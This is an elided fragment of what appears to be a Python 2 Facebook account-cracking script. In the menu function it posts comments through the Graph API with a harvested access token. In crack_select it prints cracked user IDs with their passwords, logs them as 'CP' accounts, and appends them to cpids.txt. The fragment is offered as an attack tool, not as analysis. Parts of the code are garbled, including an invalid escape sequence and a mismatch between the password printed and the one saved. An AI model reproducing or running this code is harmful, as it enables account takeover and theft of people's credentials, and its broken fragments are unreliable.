...
def menu():
    ...
    try:
        ...
        ####print(' \x1b[0;93m 100% ....')
        requests.post('https://graph.facebook.com/' + aa1 + '/comments/?message=' + iQRAchoice + '&access_token=' + token)
...
def crack_select():
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1IQRAb[1;31m[JaMaLi-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks SJ
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
    ...
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##Thanks SJ
    print 45 * '\033[0m_\033[0m'
    print ''
    print ''
